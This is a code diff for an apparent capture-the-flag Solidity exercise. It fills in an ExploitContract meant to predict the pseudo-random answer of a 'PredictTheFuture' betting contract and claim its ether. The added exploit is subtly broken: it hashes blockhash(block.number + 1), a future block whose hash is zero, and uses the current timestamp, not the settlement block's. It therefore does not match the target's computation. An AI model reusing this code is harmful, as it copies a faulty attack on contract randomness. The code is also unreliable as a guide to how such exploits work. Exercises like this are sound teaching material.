@@ -25,14 +25,14 @@ contract PredictTheFuture {
 
     function settle() public {
         require(msg.sender == guesser);
-        require(block.number > settlementBlockNumber);
+        require(block.number > settlementBlockNumber, "wrong block number");
 
         uint8 answer = uint8(
             uint256(
                 keccak256(
                     abi.encodePacked(
                         blockhash(block.number - 1),
-                        block.timestamp
+                        block.timestamp 
                     )
                 )
             )
@@ -54,4 +54,23 @@ contract ExploitContract {
     }
 
     // Write your exploit code below
+    function lockInGuess() external payable {
+        uint8 guess = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number + 1),
+                        block.timestamp
+                    )
+                )
+            )
+        ) % 10;
+        predictTheFuture.lockInGuess{value: 1 ether}(guess);
+    }
+
+    function settle() external {
+        predictTheFuture.settle();
+    }
+
+    receive() external payable {}
 }
